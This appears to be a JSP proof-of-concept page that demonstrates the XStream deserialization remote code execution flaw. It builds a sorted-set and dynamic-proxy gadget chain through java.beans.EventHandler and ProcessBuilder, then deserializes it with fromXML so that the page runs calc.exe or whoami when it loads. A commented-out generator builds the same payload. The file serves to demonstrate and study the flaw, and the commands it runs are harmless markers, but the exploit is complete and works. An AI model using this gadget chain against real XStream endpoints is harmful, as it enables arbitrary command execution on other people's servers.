<%@ page import="com.thoughtworks.xstream.XStream" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    //    String expGen() {
//        XStream         xstream = new XStream();
//        Set<Comparable> set     = new TreeSet<Comparable>();
//        set.add("foo");
//        set.add(EventHandler.create(Comparable.class, new ProcessBuilder("open -a Calculator.app"), "start"));
//        String payload = xstream.toXML(set);
//        System.out.println(payload);
//        return payload;
//    }
%>
<%
    //    expGen();

    String command;
    if (System.getProperty("os.name") != null && System.getProperty("os.name").startsWith("Win")) {
        command = "calc.exe";
    } else {
        command = "whoami";
    }
    XStream xStream = new XStream();
    String payload = "<sorted-set>\n" +
            "    <string>foo</string>\n" +
            "    <dynamic-proxy>\n" +
            "    <interface>java.lang.Comparable</interface>\n" +
            "        <handler class=\"java.beans.EventHandler\">\n" +
            "            <target class=\"java.lang.ProcessBuilder\">\n" +
            "                <command>\n" +
            "                    <string>" + command + "</string>\n" +
            "                </command>\n" +
            "            </target>\n" +
            "     <action>start</action>" +
            "        </handler>\n" +
            "    </dynamic-proxy>\n" +
            "</sorted-set>\n";

    xStream.fromXML(payload);
%>